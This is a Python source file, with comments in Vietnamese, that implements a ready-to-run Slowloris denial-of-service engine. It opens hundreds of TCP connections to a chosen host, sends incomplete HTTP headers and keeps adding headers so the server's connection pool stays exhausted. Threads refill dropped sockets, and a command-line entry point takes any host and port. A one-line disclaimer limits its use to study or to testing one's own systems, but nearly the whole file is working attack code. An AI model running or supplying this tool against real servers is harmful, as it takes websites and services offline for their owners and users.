#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Slowloris Attack Engine
Kỹ thuật: Mở nhiều kết nối TCP và giữ chúng mở bằng cách
gửi partial HTTP headers, làm cạn kiệt connection pool của server.
Chỉ dùng cho mục đích học thuật / kiểm thử hệ thống của bạn.
"""

import socket
import time
import random
import threading
import logging
from dataclasses import dataclass, field
from typing import Optional, List
import asyncio

logger = logging.getLogger('ddos.slowloris')

HEADERS = [
    "X-Custom-Header-{}",
    "X-Forwarded-For",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "X-Host",
    "X-Forwarded-Host",
]


@dataclass
class SlowlorisStats:
    sockets_opened: int = 0
    sockets_active: int = 0
    sockets_failed: int = 0
    headers_sent: int = 0
    start_time: float = field(default_factory=time.time)
    running: bool = False

    def to_dict(self) -> dict:
        return {
            'sockets_opened': self.sockets_opened,
            'sockets_active': self.sockets_active,
            'sockets_failed': self.sockets_failed,
            'headers_sent': self.headers_sent,
            'elapsed': round(time.time() - self.start_time, 1),
            'running': self.running,
        }


class SlowlorisAttack:
    """
    Slowloris attack: Mở nhiều kết nối TCP, gửi partial headers
    để giữ server bận xử lý những request chưa hoàn chỉnh.
    """

    def __init__(
        self,
        host: str,
        port: int = 80,
        num_sockets: int = 200,
        duration: int = 30,
        sleep_between_headers: float = 10.0,
        stats_callback=None,
    ):
        self.host = host
        self.port = port
        self.num_sockets = num_sockets
        self.duration = duration
        self.sleep_between_headers = sleep_between_headers
        self.stats_callback = stats_callback

        self.stats = SlowlorisStats()
        self._stop = threading.Event()
        self._sockets: List[socket.socket] = []
        self._lock = threading.Lock()

    def _create_socket(self) -> Optional[socket.socket]:
        """Tạo một socket và gửi partial HTTP request."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.host, self.port))

            # Gửi partial HTTP GET header (không gửi \r\n\r\n)
            s.send(f"GET /?q={random.randint(1,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.host}\r\n".encode())
            s.send(f"User-Agent: Mozilla/5.0 (compatible; SecurityTest)\r\n".encode())
            s.send(f"Accept: text/html\r\n".encode())
            s.send(f"Accept-Language: en-US\r\n".encode())
            s.send(f"Connection: keep-alive\r\n".encode())
            # KHÔNG gửi \r\n kết thúc -> server chờ headers thêm

            with self._lock:
                self._sockets.append(s)
                self.stats.sockets_opened += 1
                self.stats.sockets_active += 1

            return s

        except Exception as e:
            self.stats.sockets_failed += 1
            return None

    def _send_keep_alive(self, s: socket.socket) -> bool:
        """Gửi thêm một header để giữ connection sống."""
        try:
            header_name = random.choice(HEADERS).format(random.randint(1, 999))
            header_val = random.randint(1, 65535)
            s.send(f"{header_name}: {header_val}\r\n".encode())
            self.stats.headers_sent += 1
            return True
        except Exception:
            return False

    def _connection_keeper(self):
        """Thread giữ các socket active bằng cách gửi partial headers."""
        while not self._stop.is_set():
            with self._lock:
                dead_sockets = []
                for s in self._sockets:
                    if not self._send_keep_alive(s):
                        dead_sockets.append(s)

                # Dọn socket chết
                for s in dead_sockets:
                    try:
                        s.close()
                    except Exception:
                        pass
                    self._sockets.remove(s)
                    self.stats.sockets_active -= 1

            time.sleep(self.sleep_between_headers)

    def _socket_refiller(self):
        """Thread thêm socket mới khi có socket bị chết."""
        while not self._stop.is_set():
            with self._lock:
                current = len(self._sockets)

            if current < self.num_sockets:
                to_create = min(10, self.num_sockets - current)
                for _ in range(to_create):
                    if self._stop.is_set():
                        break
                    self._create_socket()
                    time.sleep(0.05)
            else:
                time.sleep(0.5)

    def _stats_reporter(self, callback):
        """Thread báo cáo stats."""
        while not self._stop.is_set():
            callback(self.stats.to_dict())
            time.sleep(0.5)

    def run(self):
        """Chạy Slowloris attack."""
        self.stats = SlowlorisStats()
        self.stats.running = True
        self._stop.clear()
        self._sockets = []

        logger.info(f"Slowloris → {self.host}:{self.port}, sockets={self.num_sockets}")

        # Phase 1: Mở socket ban đầu
        logger.info(f"Mở {self.num_sockets} socket ban đầu...")
        for i in range(min(self.num_sockets, 50)):
            self._create_socket()
            time.sleep(0.02)

        # Phase 2: Chạy background threads
        threads = [
            threading.Thread(target=self._connection_keeper, daemon=True),
            threading.Thread(target=self._socket_refiller, daemon=True),
        ]

        if self.stats_callback:
            threads.append(
                threading.Thread(target=self._stats_reporter, args=(self.stats_callback,), daemon=True)
            )

        for t in threads:
            t.start()

        # Chạy trong duration giây
        start = time.time()
        while time.time() - start < self.duration and not self._stop.is_set():
            time.sleep(0.5)

        self.stop()

        if self.stats_callback:
            self.stats_callback(self.stats.to_dict())

        return self.stats.to_dict()

    def stop(self):
        """Dừng attack và đóng tất cả socket."""
        self._stop.set()
        self.stats.running = False

        with self._lock:
            for s in self._sockets:
                try:
                    s.close()
                except Exception:
                    pass
            self._sockets.clear()
            self.stats.sockets_active = 0


def run_slowloris(
    host: str,
    port: int = 8080,
    num_sockets: int = 200,
    duration: int = 30,
    sleep_between: float = 10.0,
    stats_callback=None,
) -> dict:
    """Helper function để chạy Slowloris."""
    engine = SlowlorisAttack(
        host=host,
        port=port,
        num_sockets=num_sockets,
        duration=duration,
        sleep_between_headers=sleep_between,
        stats_callback=stats_callback,
    )
    return engine.run()


if __name__ == '__main__':
    import sys
    logging.basicConfig(level=logging.INFO)

    host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    print(f"🐌 Slowloris → {host}:{port}")

    def cb(stats):
        print(f"\r  Sockets: {stats['sockets_active']}/{stats['sockets_opened']}  "
              f"Headers: {stats['headers_sent']}  "
              f"Failed: {stats['sockets_failed']}  "
              f"Time: {stats['elapsed']}s", end='', flush=True)

    result = run_slowloris(host, port, num_sockets=150, duration=20, stats_callback=cb)
    print(f"\n✅ Done: {result}")
